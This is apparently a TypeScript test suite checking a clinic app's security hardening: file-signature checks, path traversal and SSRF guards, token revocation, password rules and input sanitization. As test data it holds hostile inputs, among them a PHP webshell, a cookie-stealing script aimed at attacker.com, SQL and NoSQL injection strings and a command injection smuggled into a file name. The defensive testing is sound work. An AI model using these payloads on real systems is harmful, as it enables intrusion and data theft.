import dotenv from "dotenv";
import path from "path";
dotenv.config({ path: path.join(__dirname, ".env") });

import {
  MagicBytesValidator,
  PathTraversalSanitizer,
  SsrfGuard,
  TokenBlacklistService,
  PasswordSecurityPolicy,
  InputSanitizer,
} from "./api/src/modules/security/security-hardening.service";
import { strictAuthLimiter, globalApiLimiter } from "./api/src/modules/security/rate-limiters";
import { suspiciousRequestDetector } from "./api/middleware/security.middleware";

async function runDay19Tests() {
  console.log("================================================================================");
  console.log("🛡️ DAY 19 EMPIRICAL TEST SUITE: PRODUCTION SECURITY HARDENING & OWASP AUDIT");
  console.log("================================================================================\n");

  let passedAssertions = 0;

  function assert(condition: boolean, desc: string) {
    if (!condition) {
      console.error(`❌ ASSERTION FAILED: ${desc}`);
      throw new Error(`Assertion failed: ${desc}`);
    }
    passedAssertions++;
    console.log(`  ✓ [ASSERT #${passedAssertions}] ${desc}`);
  }

  try {
    // -------------------------------------------------------------------------
    // STEP 1: MAGIC BYTES & FILE SIGNATURE INTEGRITY (OWASP A08)
    // -------------------------------------------------------------------------
    console.log("🔷 Step 1: Testing Magic Byte Signatures & Executable Disguise Detection...");

    // 1.1 Valid PNG Magic Bytes: 89 50 4E 47 0D 0A 1A 0A
    const validPngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
    assert(MagicBytesValidator.validate(validPngBuffer, "image/png") === true, "Valid PNG magic bytes must pass validation");

    // 1.2 Disguised Windows PE Executable with PNG extension (.exe renamed to .png)
    // PE starts with 'MZ' (0x4D, 0x5A)
    const disguisedExeBuffer = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
    assert(MagicBytesValidator.validate(disguisedExeBuffer, "image/png") === false, "Disguised Windows executable (.exe) must be rejected for image/png");

    // 1.3 Disguised Linux ELF Binary
    // ELF starts with 0x7F, 0x45, 0x4C, 0x46 ('\x7fELF')
    const disguisedElfBuffer = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
    assert(MagicBytesValidator.validate(disguisedElfBuffer, "image/png") === false, "Disguised Linux ELF binary must be rejected for image/png");

    // 1.4 Disguised Script Tag (XSS/Polyglot file)
    const scriptTagBuffer = Buffer.from("<script>alert('xss')</script>PNG_DATA_HERE");
    assert(MagicBytesValidator.validate(scriptTagBuffer, "image/png") === false, "Embedded script tag must be rejected as malicious payload");

    // 1.5 Disguised PHP Webshell
    const phpWebshellBuffer = Buffer.from("<?php system($_GET['cmd']); ?>");
    assert(MagicBytesValidator.validate(phpWebshellBuffer, "image/png") === false, "PHP webshell payload must be rejected as malicious executable");

    // 1.6 Valid JPEG Magic Bytes: FF D8 FF
    const validJpegBuffer = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
    assert(MagicBytesValidator.validate(validJpegBuffer, "image/jpeg") === true, "Valid JPEG magic bytes must pass validation");

    // 1.7 Corrupted JPEG Buffer
    const corruptedJpegBuffer = Buffer.from([0x00, 0x00, 0x00, 0x00]);
    assert(MagicBytesValidator.validate(corruptedJpegBuffer, "image/jpeg") === false, "Corrupted zero-byte buffer must fail JPEG validation");

    // 1.8 Valid PDF Magic Bytes: 25 50 44 46 (%PDF)
    const validPdfBuffer = Buffer.from("%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>");
    assert(MagicBytesValidator.validate(validPdfBuffer, "application/pdf") === true, "Valid PDF magic bytes (%PDF) must pass validation");

    // 1.9 Truncated Buffer (< 4 bytes)
    const tinyBuffer = Buffer.from([0x89, 0x50]);
    assert(MagicBytesValidator.validate(tinyBuffer, "image/png") === false, "Truncated buffer (< 4 bytes) must be rejected");

    // 1.10 Standalone Executable Detector
    assert(MagicBytesValidator.isExecutableOrScript(disguisedExeBuffer) === true, "Executable detector catches PE 'MZ' header");

    // -------------------------------------------------------------------------
    // STEP 2: PATH TRAVERSAL DEFENSE & SAFE RESOLUTION (OWASP A01 / A03)
    // -------------------------------------------------------------------------
    console.log("\n🔷 Step 2: Testing Directory Traversal Neutralization & Safe Path Resolution...");

    // 2.1 Stripping directory traversal sequences
    const traversedName = "../../../etc/passwd";
    const sanitizedName = PathTraversalSanitizer.sanitizeFileName(traversedName);
    assert(sanitizedName === "passwd", `Path traversal in '${traversedName}' must be stripped to 'passwd' (got '${sanitizedName}')`);

    // 2.2 Eliminating dangerous null bytes (\0 injection)
    const nullByteName = "report_2026.pdf\0.exe";
    const cleanNullName = PathTraversalSanitizer.sanitizeFileName(nullByteName);
    assert(!cleanNullName.includes("\0") && cleanNullName === "report_2026.pdf.exe", "Null byte injection must be eliminated");

    // 2.3 Eliminating command injection characters
    const commandInjName = "doctor_seal$(whoami);rm.png";
    const cleanCmdName = PathTraversalSanitizer.sanitizeFileName(commandInjName);
    assert(!cleanCmdName.includes("$") && !cleanCmdName.includes(";") && !cleanCmdName.includes(" "), "Command injection symbols must be replaced with safe characters");

    // 2.4 Stripping leading dot to prevent hidden files
    const hiddenName = ".bash_profile";
    const cleanHidden = PathTraversalSanitizer.sanitizeFileName(hiddenName);
    assert(!cleanHidden.startsWith("."), "Leading dot must be stripped to prevent hidden filesystem artifacts");

    // 2.5 Path confinement check within base directory
    const baseDir = path.resolve(process.cwd(), "uploads", "signatures");
    const safeSubPath = "doctor_123.png";
    assert(PathTraversalSanitizer.isSafePath(baseDir, safeSubPath) === true, "Path within target uploads directory is confirmed safe");

    // 2.6 Directory escape attempt using parent directories
    const escapePath = "../../secret.env";
    assert(PathTraversalSanitizer.isSafePath(baseDir, escapePath) === false, "Traversal attempting to escape base directory must return false");

    // 2.7 Windows-style path traversal escape
    const winEscapePath = "..\\..\\windows\\system32";
    assert(PathTraversalSanitizer.isSafePath(baseDir, winEscapePath) === false, "Windows backslash directory traversal must return false");

    // 2.8 Safe resolution throws exception on traversal attempt
    let exceptionThrown = false;
    try {
      PathTraversalSanitizer.safePathResolve(baseDir, "../../../etc/shadow");
    } catch {
      exceptionThrown = true;
    }
    assert(exceptionThrown === true, "safePathResolve must throw a security exception on traversal attempt");

    // -------------------------------------------------------------------------
    // STEP 3: SSRF PROTECTION & PRIVATE IP RANGE BLOCKING (OWASP A10)
    // -------------------------------------------------------------------------
    console.log("\n🔷 Step 3: Testing SSRF Protection, Cloud Metadata & Private IP Range Filters...");

    // 3.1 Loopback addresses
    assert(SsrfGuard.isPrivateOrReservedIp("127.0.0.1") === true, "127.0.0.1 must be identified as loopback");
    assert(SsrfGuard.isPrivateOrReservedIp("localhost") === true, "'localhost' must be identified as reserved");

    // 3.2 Private Class A (10.0.0.0/8)
    assert(SsrfGuard.isPrivateOrReservedIp("10.0.1.55") === true, "10.0.1.55 must be identified as private Class A network");

    // 3.3 Private Class B (172.16.0.0/12)
    assert(SsrfGuard.isPrivateOrReservedIp("172.20.10.1") === true, "172.20.10.1 must be identified as private Class B network");

    // 3.4 Private Class C (192.168.0.0/16)
    assert(SsrfGuard.isPrivateOrReservedIp("192.168.1.100") === true, "192.168.1.100 must be identified as private Class C network");

    // 3.5 Cloud Metadata IP (169.254.169.254 AWS/GCP/Azure)
    assert(SsrfGuard.isPrivateOrReservedIp("169.254.169.254") === true, "Cloud metadata endpoint 169.254.169.254 must be blocked");

    // 3.6 IPv6 Loopback
    assert(SsrfGuard.isPrivateOrReservedIp("::1") === true, "IPv6 loopback ::1 must be identified as reserved");

    // 3.7 Valid public webhook URL
    const publicUrlCheck = SsrfGuard.isSafeWebhookUrl("https://graph.facebook.com/v18.0/messages");
    assert(publicUrlCheck.isSafe === true, "Valid public HTTPS endpoint passes SSRF verification");

    // 3.8 Disallowed protocol schemes
    const fileUrlCheck = SsrfGuard.isSafeWebhookUrl("file:///etc/passwd");
    assert(fileUrlCheck.isSafe === false, "file:// protocol scheme must be rejected by SSRF guard");

    // -------------------------------------------------------------------------
    // STEP 4: JWT TOKEN REVOCATION & BLACKLIST ENGINE (OWASP A07)
    // -------------------------------------------------------------------------
    console.log("\n🔷 Step 4: Testing JWT Blacklist Service & O(1) Memory Revocation...");

    TokenBlacklistService.clear();

    const sampleToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.sample_payload_day19_test";
    const tokenTtlMs = Date.now() + 15 * 60 * 1000; // 15 mins

    // 4.1 Token initially not blacklisted
    assert(TokenBlacklistService.isTokenRevoked(sampleToken) === false, "Active valid token is not blacklisted");

    // 4.2 Revoking token
    TokenBlacklistService.revokeToken(sampleToken, tokenTtlMs);
    assert(TokenBlacklistService.isTokenRevoked(sampleToken) === true, "Revoked token is immediately recognized as blacklisted");

    // 4.3 Blacklist lookup is resilient
    assert(TokenBlacklistService.isTokenRevoked("different_token") === false, "Unrelated token is not blacklisted");

    // 4.4 Blacklist count
    assert(TokenBlacklistService.getRevokedCount() === 1, "Blacklist size reflects 1 active revoked token");

    // 4.5 Expired token pruning
    const expiredToken = "expired_token_signature_test";
    const pastTimeMs = Date.now() - 5000; // Expired 5 seconds ago
    TokenBlacklistService.revokeToken(expiredToken, pastTimeMs);

    const pruned = TokenBlacklistService.pruneExpiredTokens();
    assert(pruned >= 1, "pruneExpiredTokens cleans up naturally expired blacklist entries");
    assert(TokenBlacklistService.isTokenRevoked(expiredToken) === false, "Expired token is evicted and returns false");

    // 4.6 Empty token handling
    assert(TokenBlacklistService.isTokenRevoked("") === false, "Empty token check returns false safely");

    // 4.7 Clear blacklist
    TokenBlacklistService.clear();
    assert(TokenBlacklistService.getRevokedCount() === 0, "Clear method empties all blacklist entries");

    // -------------------------------------------------------------------------
    // STEP 5: ENTERPRISE PASSWORD COMPLEXITY POLICY (OWASP A07)
    // -------------------------------------------------------------------------
    console.log("\n🔷 Step 5: Testing Enterprise Password Complexity & Privilege Role Enforcement...");

    // 5.1 Common dictionary password rejection
    const commonCheck = PasswordSecurityPolicy.validate("password123");
    assert(commonCheck.isValid === false, "'password123' must be rejected as common password");

    // 5.2 Short password (< 8 characters)
    const shortCheck = PasswordSecurityPolicy.validate("Lab1!");
    assert(shortCheck.isValid === false, "Password shorter than 8 characters must fail");

    // 5.3 Privileged admin role (requires min 12 characters)
    const adminShortCheck = PasswordSecurityPolicy.validate("LabCore123!", true);
    assert(adminShortCheck.isValid === false, "11-character password must fail for privileged admin role (requires 12+)");

    // 5.4 Missing uppercase
    const noUpperCheck = PasswordSecurityPolicy.validate("labcore@2026");
    assert(noUpperCheck.isValid === false, "Password without uppercase must fail validation");

    // 5.5 Missing digit
    const noDigitCheck = PasswordSecurityPolicy.validate("LabCoreEnterprise!");
    assert(noDigitCheck.isValid === false, "Password without numeric digits must fail validation");

    // 5.6 Missing special character
    const noSpecialCheck = PasswordSecurityPolicy.validate("LabCoreEnterprise2026");
    assert(noSpecialCheck.isValid === false, "Password without special character must fail validation");

    // 5.7 Strong compliant password
    const strongCheck = PasswordSecurityPolicy.validate("LabCore@Enterprise2026!", true);
    assert(strongCheck.isValid === true, "Strong 23-char complex password passes all validation criteria");

    // -------------------------------------------------------------------------
    // STEP 6: DEEP RECURSIVE INPUT SANITIZATION (OWASP A03)
    // -------------------------------------------------------------------------
    console.log("\n🔷 Step 6: Testing Recursive Input Audit for XSS, Event Handlers & SQL Injection...");

    // 6.1 Clean patient intake payload
    const cleanPayload = {
      firstName: "Devendra",
      lastName: "Patel",
      phone: "919810012345",
      notes: "Routine health checkup fasting blood collection",
    };
    const cleanAudit = InputSanitizer.auditPayload(cleanPayload);
    assert(cleanAudit.isClean === true, "Clean clinical patient intake payload passes audit without violations");

    // 6.2 Malicious script tag injection
    const xssPayload = {
      patientName: "John Doe<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>",
    };
    const xssAudit = InputSanitizer.auditPayload(xssPayload);
    assert(xssAudit.isClean === false && xssAudit.violations.length > 0, "XSS <script> payload is flagged as violation");

    // 6.3 Inline event handler injection (e.g. onerror=, onload=)
    const eventHandlerPayload = {
      clinicalObservation: 'Normal RBC <img src="x" onerror="alert(1)"> morphology',
    };
    const eventAudit = InputSanitizer.auditPayload(eventHandlerPayload);
    assert(eventAudit.isClean === false, "Inline event handler 'onerror=' is flagged as violation");

    // 6.4 SQL injection keyword combination
    const sqliPayload = {
      searchQuery: "Ashok' UNION SELECT id, password_hash, email FROM users--",
    };
    const sqliAudit = InputSanitizer.auditPayload(sqliPayload);
    assert(sqliAudit.isClean === false, "SQL injection 'UNION SELECT' attempt is flagged as violation");

    // 6.5 MongoDB-style operator injection ({ "$gt": "" })
    const mongoInjPayload = {
      filter: {
        username: "admin",
        password: { $gt: "" },
      },
    };
    const mongoAudit = InputSanitizer.auditPayload(mongoInjPayload);
    assert(mongoAudit.isClean === false, "Forbidden operator key '$gt' is flagged as violation");

    // 6.6 javascript: URI scheme
    const jsUriPayload = {
      website: "javascript:alert(document.domain)",
    };
    const jsUriAudit = InputSanitizer.auditPayload(jsUriPayload);
    assert(jsUriAudit.isClean === false, "'javascript:' URI scheme is flagged as violation");

    // -------------------------------------------------------------------------
    // STEP 7: RATE LIMITING & SECURITY MIDDLEWARE VERIFICATION
    // -------------------------------------------------------------------------
    console.log("\n🔷 Step 7: Testing Rate Limiter Contracts & Suspicious Request Middleware...");

    // 7.1 Verify rate limiters exported and configured
    assert(typeof strictAuthLimiter === "function", "strictAuthLimiter is an active Express middleware");
    assert(typeof globalApiLimiter === "function", "globalApiLimiter is an active Express middleware");

    // 7.2 Suspicious request detector middleware blocks dangerous payload
    let middlewareStatus = 0;
    let middlewareJson: any = null;

    const mockBadReq: any = {
      body: {
        query: "DROP TABLE patients;--",
      },
      headers: {},
      ip: "192.168.1.50",
    };

    const mockBadRes: any = {
      status(code: number) {
        middlewareStatus = code;
        return this;
      },
      json(data: any) {
        middlewareJson = data;
        return this;
      },
    };

    suspiciousRequestDetector(mockBadReq, mockBadRes, () => {});
    assert(middlewareStatus === 400, "suspiciousRequestDetector blocks SQL injection with HTTP 400");
    assert(middlewareJson.code === "SUSPICIOUS_PAYLOAD", "Response payload code is SUSPICIOUS_PAYLOAD");

    // 7.3 Suspicious request detector allows clean payload
    let nextCalled = false;
    const mockCleanReq: any = {
      body: {
        query: "Complete Blood Count",
      },
      headers: {},
      ip: "192.168.1.50",
    };

    suspiciousRequestDetector(mockCleanReq, mockBadRes, () => {
      nextCalled = true;
    });
    assert(nextCalled === true, "suspiciousRequestDetector calls next() for clean payload");

    console.log("\n================================================================================");
    console.log(`🏆 ALL ${passedAssertions} DAY 19 EMPIRICAL ASSERTIONS PASSED WITH 100% SUCCESS!`);
    console.log("================================================================================\n");
  } catch (err: any) {
    console.error("❌ DAY 19 TEST EXECUTION FAILED:", err);
    process.exit(1);
  }
}

runDay19Tests()
  .then(() => {
    process.exit(0);
  })
  .catch((err) => {
    console.error(err);
    process.exit(1);
  });
